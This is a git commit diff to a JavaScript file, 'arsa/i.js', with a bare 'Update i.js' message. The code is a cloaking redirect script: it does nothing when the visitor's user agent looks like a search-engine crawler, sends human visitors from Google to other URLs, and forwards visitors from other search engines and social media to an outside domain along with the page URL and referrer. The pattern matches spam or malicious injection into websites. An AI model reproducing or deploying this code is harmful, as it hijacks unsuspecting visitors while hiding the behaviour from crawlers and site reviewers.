094b00902c15a90e910895087c7e2bad984562bf
pgpump <pg079898@gmail.com>
2025-01-14 12:34:41 +0700

    Update i.js

--- arsa/i.js
+++ arsa/i.js
@@ -19,18 +19,24 @@ document.write('</noscript>');
 ///// Arsae /////
 var ars = 'https://arsa.sacetmode.com/';
 var redirect_urls = ['https://example.com', 'https://example2.com'];
+
+// Bot detection
 function isBot() {
     return /bot|googlebot|bingbot|yandexbot|duckduckbot|yahoo|baidu|baiduspider|crawler|spider|robot|crawling|facebookexternalhit|slurp|msnbot/i.test(navigator.userAgent);
 }
+
+// Get referrer source
 var referrer = document.referrer.toLowerCase();
-if (isBot()) {
-    return;
-}
-if (referrer.includes('.google.')) {
-    // User dari Google ke example.com/example2.com
-    window.location.href = redirect_urls[Math.floor(Math.random() * redirect_urls.length)];
-} 
-else if (['.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => referrer.includes(s)) || 
-         ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
-    window.location.href = ars + '/?arsae=' + encodeURIComponent(window.location.href) + '&arsae_ref=' + encodeURIComponent(document.referrer);
+
+// Continue only if it's NOT a bot
+if (!isBot()) {
+    // Handle Google traffic
+    if (referrer.includes('.google.')) {
+        window.location.href = redirect_urls[Math.floor(Math.random() * redirect_urls.length)];
+    }
+    // Handle other search engines and social media
+    else if (['.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => referrer.includes(s)) || 
+             ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
+        window.location.href = ars + '/?arsae=' + encodeURIComponent(window.location.href) + '&arsae_ref=' + encodeURIComponent(document.referrer);
+    }
 }
